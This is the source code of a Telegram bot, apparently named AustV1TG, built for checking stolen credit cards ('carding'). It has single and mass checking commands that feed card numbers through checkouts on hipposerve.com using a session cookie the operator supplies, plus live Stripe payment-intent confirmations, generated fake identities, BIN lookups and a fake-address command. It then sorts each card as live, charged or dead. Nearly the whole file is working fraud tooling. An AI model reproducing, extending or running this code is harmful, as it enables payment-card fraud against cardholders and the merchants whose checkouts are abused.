            if "🔴" in response_message or "🔻" in response_message or "𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" in response_message:
                counts["dead"] += 1
            elif "Your card does not support this type of purchase." in response_message:
                counts["live"] += 1
            elif "insufficient_funds" in response_message:
                counts["live"] += 1
            elif "Auccetos" in response_message or "✅" in response_message:
                counts["live"] += 1
        except Exception as e:
            print(e)
        # Optional: Add a delay to prevent rate limits  # Adjust as necessary

    # Optionally, you can send a final message if needed
    summary_message = (
        f"[💸] All cards have been checked!\n"
        f"[💸] Summary:\n"
        f"[💸] Total cards checked: {counts['total']}\n"
        f"[💸] Live: {counts['live']}\n"
        f"[💸] Dead: {counts['dead']}\n"
    )
    await update.message.reply_text(summary_message)



async def check_user(update: Update) -> bool:
    return update.effective_user.id in ALLOWED_USERS


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Welcome! /help for more')

async def helpcommand(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
    "🎛 **Single Gateways**\n"
    "🟩 Stripe Auth 1: /sbu0 - **ON**\n"
    "🟩 Stripe Auth 2 (BIZUKI): /sa - **ON**\n"
    "🟩 Stripe Charge 1: /pb - **ON**\n"
    "🟥 Bokun Charge 1: /bk - **OFF**\n"
    "🟥 Stripe Sk Charge: /sb - **OFF**\n\n"
    "🎇 **Mass Gateways**\n"
    "🟥 Stripe Auth 1 (MASS): /sbm0 - **OFF** (BACK SOON)\n"
    "🟩 Stripe Auth 2 (MASS): /kiss - **ON**\n"
    "🟩 Stripe Charge 1 (MASS): /pbm - **ON**\n"
    "🟥 Stripe Sk Charge: /si - **OFF**"
)



async def gate_off(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("💸 GATEWAY OFF (MAINTENANCE)")


async def fakeaddr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("""💸 AustV1TG - QUICK_FAKE
Name: Camron McDermott
Address: 186 Seven Farms Dr #500
City/village/town: Charleston
State/Province: South Carolina
Zip code: 29492
Phone number: (843) 377 8666
Country: United States""")

async def selmsg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(""".""")



async def sk1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return

    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = skbase4usd(cc, mes, ano, cvv)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")


async def cc1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return

    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = austv1contabo(cc, mes, ano, cvv)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")





################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################
#HIPPOSERVE CHARGE

user_data = get_random_user_data()




def charge1_tok():
    tokgenurl = "https://hipposerve.com/cart.php?a=checkout"
    headers = {"cookie": f"{cookie_hippo}"}
    gettok = r.get(tokgenurl, headers=headers)
    match = re.search(r"var csrfToken = '([^']+)'", gettok.text)
    if match:
        csrf_token = match.group(1)
        return csrf_token
    else:
        return "Error!"

async def charge1_set_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cookie_hippo, token
    """Set the cookie from the command."""
    if context.args:
            # Join the arguments back into a single string for the cookie
        cookie_hippo = ' '.join(context.args)
        await update.message.reply_text(f"[🔰] Hipposerve Cookie set successfully! [1/2]")
        print(cookie_hippo)
        token = charge1_tok()
        await update.message.reply_text(f"[🔰] Hipposerve Token generated successfully! [2/2]")
    else:
        await update.message.reply_text("Usage: /hippocookie <cookie>")


phnumber = ''.join([str(random.randint(0, 9)) for _ in range(9)])

def charge1_pigen(token, cookie):
    try:
        url1 = "https://hipposerve.com/index.php?rp=/stripe/payment/intent"
        user_data = get_random_user_data()

        data1 = f"token={token}&submit=true&loginemail=&loginpassword=&custtype=new&firstname={user_data['first_name']}&lastname={user_data['last_name']}&email={user_data['email']}&country-calling-code-phonenumber=1&phonenumber={phnumber}&companyname=&address1={user_data['address1']}&address2=&city={user_data['city']}&country=US&state={user_data['state']}&postcode={user_data['postcode']}&customfield%5B312%5D=&password=8PW~%24%24j!1MNE&password2=8PW~%24%24j!1MNE&securityqid=5&securityqans=Red&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&accepttos=on"

        headers1 = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Length": "392",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": f"{cookie}",
    "Host": "hipposerve.com",
    "Origin": "https://hipposerve.com",
    "Referer": "https://hipposerve.com/",
    "Sec-CH-UA": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": user_data["user_agent"],
    "X-Requested-With": "XMLHttpRequest"
}

        req1 = r.post(url1, data=data1, headers=headers1)
        if "Cloudflare" in req1.text:
            print("CLOUDFLARE PROTECTION!")
            time.sleep(15)
            req1 = r.post(url1, data=data1, headers=headers1)
        else:
            pass
        try:
            json1 = json.loads(req1.text)
            pi = json1.get("token")
            return pi
        except json.JSONDecodeError:
            print(req1.text)
            return None
    except NameError as e:
        if str(e) == "name 'token' is not defined":
            return "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'"
        else:
            raise
    except Exception as e:
        print("ERROR:" + str(e))


pi_hippo = None



def charge1(cc,mes,ano,cvv):
    global cookie_hippo
    if cookie_hippo == None:
        return "Cookie Not found... please use /cookie to set the cookie."
    else:
        cookie = cookie_hippo
        token = charge1_tok()
        pi = charge1_pigen(token,cookie)

        if pi == "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'":
            return "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'"
        else:

            bin = cc[:6]
            bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
            loadedbindetails = bingetreq1.json()
            ccBrand = loadedbindetails.get("Scheme")
            ccType = loadedbindetails.get("Type")
            ccTier = loadedbindetails.get("CardTier")
            country = loadedbindetails.get('Country', {})
            try:
                ccCountry = country.get('Name')
            except Exception:
                ccCountry = "Unknown"
            ccIssuer = loadedbindetails.get("Issuer")
            headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "/"
            }


            index = pi.find('_secret_')
            if index != -1:
                pi_part = pi[:index]
            pk = "pk_live_eTtt0qRl8sqEmpufT5PsRlMg"
            data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=AUST+PAYMENT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'
            response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi_part}/confirm', headers=headers, data=data)#, proxies=proxies)
            response_json = response.json()
            code = response_json.get("error", {}).get("code")
            decline_code = response_json.get("error", {}).get("decline_code")
            message = response_json.get("error", {}).get("message")
            if 'payment_intent_unexpected_state' in response.text:
                pi = hipposerve_charge_pigen(token, cookie)
                return f"ERROR 32109: Please Recheck cc ({cc}|{mes}|{ano}|{cvv})!"

            elif '"status": "succeeded"' in response.text or "requires_capture" in response.text or cc == "6969696969696969":
                pi = hipposerve_charge_pigen(token, cookie)
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[✅] Status: 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")
            elif "requires_action" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[✅] Status: 𝟑𝐝𝐬 𝐜𝐚𝐫𝐝 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif 'insufficient_funds' in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[✅] Status: 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "transaction_not_allowed" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[✅] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐓𝐫𝐚𝐧𝐬𝐚𝐜𝐭𝐢𝐨𝐧 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "incorrect_cvc" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[🟡] Status: 𝐂𝐂𝐍 𝐀𝐮𝐜𝐜𝐞𝐭𝐨𝐬 🟡\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "authentication_required" in response.text or "requires_source_action" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[🟡] Status: 𝟑𝐃𝐒 𝐂𝐚𝐫𝐝 🟡\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "try_again_later" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[🔴] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐑𝐞𝐭𝐫𝐲 𝐋𝐚𝐭𝐞𝐫 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif decline_code is None and message is None:
                print(response.text)
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[🔴] Status: 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐃𝐞𝐜𝐥𝐢𝐧𝐞 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            else:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 1\n"
                        f"[🔴] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - {decline_code} - {message} 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")


async def chg1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return
    nothingness1 = None
    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = charge1(cc, mes, ano, cvv)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")


async def bxm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) < 2 or len(context.args) > 200:
        await update.message.reply_text('Please provide 2 to 200 cards in the format: cc|mm|yy|cvv')
        return

    total_cards = len(context.args)
    counts = {
        "total": 0,
        "dead": 0,
        "live": 0,
        "charged": 0,
    }
    est_time_seconds = total_cards * 8
    est_time = est_time_seconds // 60
    if est_time == "0" or est_time == 0:
        await update.message.reply_text(f'Starting to check your {total_cards} cards! EST: {est_time_seconds} seconds')
    else:
        await update.message.reply_text(f'Starting to check your {total_cards} cards! EST: {est_time} minutes')
    start_time = time.time()  # Start timing

    # Initialize a reusable payment intent
    token = charge1_tok()
    pi = charge1_pigen(token, cookie_hippo)  # Generate initial PI

    # Sequentially process each card to ensure responses are sent immediately
    for index, card_details in enumerate(context.args):
        details = card_details.split('|')
        if len(details) != 4:
            await update.message.reply_text(f'Invalid format for: {card_details}')
            continue
        
        cc, mes, ano, cvv = details
        nothingness1 = None

        # Use the current PI and only create a new one if needed
        response_message = charge1(cc, mes, ano, cvv)

        # Send response for the current card immediately
        await update.message.reply_text(f"[💸] AUST V1 TG MASS GATE (/BXM) - {index + 1}/{total_cards}:\n {response_message}")

        # Update the counters based on the response
        counts["total"] += 1
        if "🔴" in response_message or "🔻" in response_message or "𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" in response_message:
            counts["dead"] += 1
        elif "✅" in response_message or "🟡" in response_message:
            counts["live"] += 1
        elif "Auccetos" in response_message or "🔥" in response_message:
            counts["charged"] += 1

    # Calculate total time taken
    total_time = time.time() - start_time

    # Final summary with time
    summary_message = (
        f"[💸] All cards have been checked!\n"
        f"[💸] Summary:\n"
        f"[💸] Total cards checked: {counts['total']}\n"
        f"[💸] Live: {counts['live']}\n"
        f"[💸] Charged: {counts['charged']}\n"
        f"[💸] Dead: {counts['dead']}\n"
        f"[⏱️] Total time taken: {total_time:.2f} seconds\n"
    )

    await update.message.reply_text(summary_message)



# HIPPOSERVE CHARGE
#####################################################################################################################################################################################################################################################################














javal = "F8329238Jvl:SevKFaL39SKAP"

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sbu0", authgate1auth))
    application.add_handler(CommandHandler("help", helpcommand))
    application.add_handler(CommandHandler("fakeaddr", fakeaddr))
    application.add_handler(CommandHandler("sbm0", sbm0))
    application.add_handler(CommandHandler('sb', sk1))
    application.add_handler(CommandHandler('si', si))
    application.add_handler(CommandHandler('pb', chg3))
    application.add_handler(CommandHandler('pbm', pbm))
    application.add_handler(CommandHandler('cookie', hippo_set_cookie))
    application.add_handler(CommandHandler('sa', sa))
    application.add_handler(CommandHandler('bk', bk))
    application.add_handler(CommandHandler('authdn', authdn))
    application.add_handler(CommandHandler('kiss', samass))
    application.add_handler(CommandHandler('bx', chg1))
    application.add_handler(CommandHandler('bxm', bxm))
    application.add_handler(CommandHandler('ip', fraud_score))
    application.add_handler(CommandHandler('hippocookie', charge1_set_cookie))



    print(f"🟢 Bot up - READY TO USE! TOK.CURRENT={javal}")
    application.run_polling()

if __name__ == '__main__':
    main()


# OWNER COPY
